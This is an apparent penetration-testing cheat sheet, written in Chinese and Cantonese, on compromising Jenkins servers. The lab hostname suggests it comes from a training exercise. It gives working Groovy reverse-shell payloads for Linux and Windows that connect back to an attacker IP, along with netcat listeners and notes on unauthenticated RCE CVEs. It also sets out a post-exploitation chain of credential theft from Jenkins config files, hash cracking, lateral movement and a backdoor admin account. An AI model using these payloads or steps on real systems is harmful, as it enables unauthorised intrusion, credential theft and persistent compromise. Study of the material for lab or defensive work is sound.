---
description: >-
  Jenkins是一個用 Java 編寫的開源自動化伺服器，可協助開發人員持續建立和測試他們的軟體專案。它是一個基於伺服器的系統，在 Tomcat 等
  servlet 容器中運行。多年來，研究人員發現了 Jenkins 中的各種漏洞，其中一些漏洞允許無需身份驗證的遠端程式碼執行。 Jenkins
  是一個持續整合伺服器。以下是有關 Jenkins 的一些有趣點：
---

# Jenkins

## <mark style="color:red;">**1. 發現點**</mark>

#### 發現 Jenkins 實例嘅方法：

1️⃣ **Nmap 掃描結果**

* 典型埠口：
  * `8080`（Jenkins Web UI）
  * `50000`（Jenkins Slave 通訊）\
    2️⃣ 瀏覽器打開：

```
http://jenkins.inlanefreight.local:8080/
```

* 如果直接可進入 UI、或 `/script` console 就係未設安全保護嘅超大機會

## <mark style="color:red;">**2. 測試Payload**</mark>

### ✅ 二、存取 Groovy Script Console

路徑：

```
http://jenkins.inlanefreight.local:8080/script
```

> **Groovy Console** 容許執行任意系統指令，如果冇身份驗證，直接可以執行任意 RCE。

***

### ✅ 三、測試 Payload & 拎反彈 Shell

#### 1️⃣ Linux 反彈 shell

```groovy
r = Runtime.getRuntime()
p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/你的IP/8443;cat <&5 | while read line; do \$line 2>&5 >&5; done"] as String[])
p.waitFor()
```

然後開 Netcat：

```
nc -lvnp 8443
```

> 成功即見到 `www-data` 或 Jenkins 用戶。

***

#### 2️⃣ Windows 系統反彈 shell

```groovy
String host="你的IP";
int port=8044;
String cmd="cmd.exe";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();
Socket s=new Socket(host,port);
InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();
OutputStream po=p.getOutputStream(),so=s.getOutputStream();
while(!s.isClosed()){
    while(pi.available()>0)so.write(pi.read());
    while(pe.available()>0)so.write(pe.read());
    while(si.available()>0)po.write(si.read());
    so.flush();po.flush();Thread.sleep(50);
    try {p.exitValue();break;}catch (Exception e){}
};
p.destroy();s.close();
```

Netcat 等 8044 端口接收。

***

## <mark style="color:red;">3. CVE 漏洞利用</mark>

#### 1️⃣ CVE-2018-1999002 & CVE-2019-1003000

* **無認證 RCE**
* 方法係透過 Jenkins 動態路由缺陷，上傳 Groovy jar 執行
* 適用版本：`Jenkins <= 2.137`

#### 2️⃣ CVE-2019-1003000 (沙盒繞過)

* 可利用腳本 console 上繞過 sandbox 限制
* 如果 console 有 read 權限，都可以利用

#### 3️⃣ CVE-2019-1003029 & CVE-2019-1003030

* 利用「Pipeline 輸入」或 Job 建立時可以執行 RCE
* 匿名用戶擁有 Job create + build 權限時可以直接上 shell

## <mark style="color:red;">5. 連鎖漏洞</mark>

| 階段         | 操作                                                                                            |
| ---------- | --------------------------------------------------------------------------------------------- |
| 系統權限確認     | `whoami` / `id` / `hostname`                                                                  |
| Windows 情況 | 大多 Jenkins service 以 **SYSTEM** 權限執行                                                          |
| 內網枚舉       | `ipconfig /all`、`net view`、`net user /domain`、`nltest /dclist`                                |
| 抓取憑證       | Windows：`dir C:\Users\Administrator\Desktop\*`、Linux：`cat /var/lib/jenkins/config.xml`（可能有密碼） |
| 破解密碼或 Hash | 將發現的 hash 用 `john`、`hashcat` 去 crack                                                          |
| 橫向滲透       | 用抓到嘅帳密登入其他服務 / WinRM / SMB / RDP                                                              |
| 提權         | `whoami /priv` 查系統特權 / `schtasks /query` 查定時任務                                                |
| 持久化        | 增加系統用戶 `net user pwned Passw0rd! /add` 並加到 admin：`net localgroup administrators pwned /add`   |
